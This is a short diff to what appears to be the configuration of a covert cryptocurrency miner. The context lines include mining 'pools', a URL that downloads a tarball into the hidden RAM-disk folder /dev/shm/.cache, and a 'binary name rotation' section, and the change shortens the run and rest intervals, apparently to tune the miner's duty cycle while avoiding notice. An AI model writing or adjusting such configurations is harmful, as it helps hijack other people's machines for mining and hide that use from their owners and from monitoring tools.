@@ -16,9 +16,9 @@ pools = [
 download_url = "https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz"
 download_output = "cache.tar.gz"
 binary_folder = "/dev/shm/.cache"
-run_minutes = 20
-rest_minutes = 5
-long_rest_minutes = 10
+run_minutes = 15
+rest_minutes = 2
+long_rest_minutes = 5
 max_runs = 10
 
 # === BINARY NAME ROTATION ===
